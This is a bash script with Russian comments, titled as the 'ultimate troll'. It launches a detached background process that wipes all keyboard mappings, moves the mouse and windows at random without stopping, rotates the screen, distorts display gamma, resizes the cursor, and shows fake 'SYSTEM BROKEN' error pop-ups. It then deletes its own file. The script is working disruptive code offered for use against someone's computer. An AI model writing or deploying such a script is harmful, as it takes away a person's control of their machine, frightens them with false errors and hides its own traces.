#!/bin/bash
# ☠️ ultimate-troll.sh — самый жесткий тролль-скрипт

nohup bash -c '

# 1️⃣ Уничтожаем управление клавиатурой
xmodmap -e "clear all"
for i in {8..255}; do xmodmap -e "keycode $i = "; done

# 2️⃣ Мышь — раб без воли
while true; do
    xdotool mousemove $((RANDOM%1920)) $((RANDOM%1080))
    sleep 0.05
done &

# 3️⃣ Вертим экран во все стороны
while true; do
    xrandr -o normal;   sleep 0.4
    xrandr -o left;     sleep 0.4
    xrandr -o inverted; sleep 0.4
    xrandr -o right;    sleep 0.4
done &

# 4️⃣ Цветовая какофония (если есть DP-1 или HDMI-1)
while true; do
    out=$(xrandr | grep " connected" | awk '{print $1}' | head -n1)
    xrandr --output "$out" --gamma $((RANDOM%3+1)).$((RANDOM%9)):0.$((RANDOM%9)):0.$((RANDOM%9))
    sleep 0.3
done &

# 5️⃣ Окна танцуют как в аду
while true; do
    for win in $(xdotool search --onlyvisible ""); do
        x=$((RANDOM%1600))
        y=$((RANDOM%900))
        xdotool windowmove $win $x $y
        sleep 0.1
    done
done &

# 6️⃣ Курсор превращается в гигантский
while true; do
    size=$((RANDOM%96+32))
    gsettings set org.gnome.desktop.interface cursor-size $size
    sleep 1
done &

# 7️⃣ Ложные ошибки атакуют
while true; do
    zenity --error --title="🔥 SYSTEM BROKEN" --text="Ядро перегрето. Требуется жертвоприношение." --timeout=2
    sleep 3
done &

# 8️⃣ Самоубийство скрипта
rm -- "$0"

' > /dev/null 2>&1 & disown
# Уведомление о запуске
# notify-send "☠️ Ultimate Troll Activated!" "Скрипт запущен. Чтобы остановить, перезагрузите систему или убейте процессы."
# echo "Ultimate Troll script is now running in the background. Enjoy the chaos!" 